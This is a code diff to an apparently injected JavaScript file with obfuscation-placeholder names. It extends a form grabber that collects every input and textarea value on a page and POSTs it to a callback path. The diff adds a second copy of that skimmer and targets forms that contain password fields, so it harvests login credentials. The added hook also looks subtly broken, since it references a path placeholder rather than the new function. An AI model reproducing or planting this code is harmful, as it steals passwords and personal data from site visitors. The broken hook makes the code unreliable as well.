@@ -1,8 +1,8 @@
 function obf_func_callback() {
 	try {
-		obf_var_inputs    = document.getElementsByTagName("input");
+		obf_var_inputs = document.getElementsByTagName("input");
 		obf_var_textareas = document.getElementsByTagName("textarea");
-		obf_var_params    = "";
+		obf_var_params = "";
 
 		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
 			if (obf_var_inputs[obf_var_i].value != "") {
@@ -16,9 +16,34 @@ function obf_func_callback() {
 		}
 
 		if (obf_var_params.length > 0) {
-		  obf_var_req = new XMLHttpRequest();
-		  obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
-		  obf_var_req.send();
+			obf_var_req = new XMLHttpRequest();
+			obf_var_req.open("POST", "http://" + location.host + "/obf_path_callback?" + obf_var_params, true);
+			obf_var_req.send();
+		}
+	} catch(obf_var_ignore){}
+}
+
+function obf_func_whitelist() {
+	try {
+		obf_var_inputs = document.getElementsByTagName("input");
+		obf_var_textareas = document.getElementsByTagName("textarea");
+		obf_var_params = "";
+
+		for (var obf_var_i = 0; obf_var_i < obf_var_inputs.length; obf_var_i++) {
+			if (obf_var_inputs[obf_var_i].value != "") {
+				obf_var_params += encodeURIComponent(obf_var_inputs[obf_var_i].name) + "=" + encodeURIComponent(obf_var_inputs[obf_var_i].value) + ( obf_var_i < (obf_var_inputs.length-1) ? "&" : "" );
+			}
+		}
+		for (var obf_var_i = 0; obf_var_i < obf_var_textareas.length; obf_var_i++) {
+			if (obf_var_textareas[obf_var_i].value != "") {
+				obf_var_params += encodeURIComponent(obf_var_textareas[obf_var_i].name) + "=" + encodeURIComponent(obf_var_textareas[obf_var_i].value) + ( obf_var_i < (obf_var_textareas.length-1) ? "&" : "" );
+			}
+		}
+
+		if (obf_var_params.length > 0) {
+			obf_var_req = new XMLHttpRequest();
+			obf_var_req.open("POST", "http://" + location.host + "/obf_path_whitelist?" + obf_var_params, true);
+			obf_var_req.send();
 		}
 	} catch(obf_var_ignore){}
 }
@@ -33,4 +58,9 @@ self.addEventListener("keyup", function(obf_var_event) {
 
 document.querySelectorAll("form").forEach(function(obf_var_form){
 	obf_var_form.addEventListener("submit", obf_func_callback);
+	document.querySelectorAll("form").forEach(function(obf_var_form){
+		if (obf_var_form.querySelector("input[type=password]")) {
+			obf_var_form.addEventListener("submit", obf_path_whitelist);
+		}
+	});
 });
